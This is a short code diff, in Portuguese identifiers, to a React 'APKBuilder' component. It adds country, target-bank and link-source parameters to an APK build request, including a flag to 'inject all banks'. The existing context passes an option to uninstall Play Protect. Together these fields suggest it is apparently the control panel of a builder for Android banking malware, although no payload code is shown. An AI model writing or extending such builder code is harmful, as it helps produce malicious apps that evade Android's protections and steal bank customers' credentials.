@@ -70,6 +70,9 @@ export function APKBuilder() {
         desinstalarPlayProtect,
         versionName,
         versionCode: parseInt(versionCode),
+        pais,
+        banco: injetarTodosBancos ? '__ALL__' : banco,
+        origemLink,
       });
 
       toast.success("APK gerado com sucesso!");
